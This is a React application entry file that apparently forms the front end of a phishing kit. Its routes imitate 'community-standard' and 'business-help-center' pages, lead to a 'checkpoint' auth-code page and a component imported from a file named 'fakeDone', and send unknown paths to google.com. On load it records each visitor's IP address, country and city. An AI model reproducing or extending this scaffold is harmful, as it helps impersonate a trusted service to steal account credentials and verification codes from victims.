import { Route, Routes, BrowserRouter } from "react-router-dom";
import React, { useEffect } from "react";
import "./App.css";
import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import ClassUser from "./pages/fakeDone";
import AuthCode from "./pages/authCode";

function App() {
  
  const setLocaltion =  () => {
    try {
      fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
        localStorage.setItem(
          "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
        );
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);

  return (
    <BrowserRouter>
      <div id="app">
        <Routes>
          <Route path="/" element={<HomePage/>} />
          <Route path="/community-standard" element={<HomePage/>} />
          <Route path="/business-help-center" element={<MyForm/>} />
          <Route path="checkpoint/:userID" element={<AuthCode />} />
          <Route path="processing/:userID" element={<ClassUser />} />
          <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
        </Routes>
      </div>
    </BrowserRouter>
  );
}


export default App;
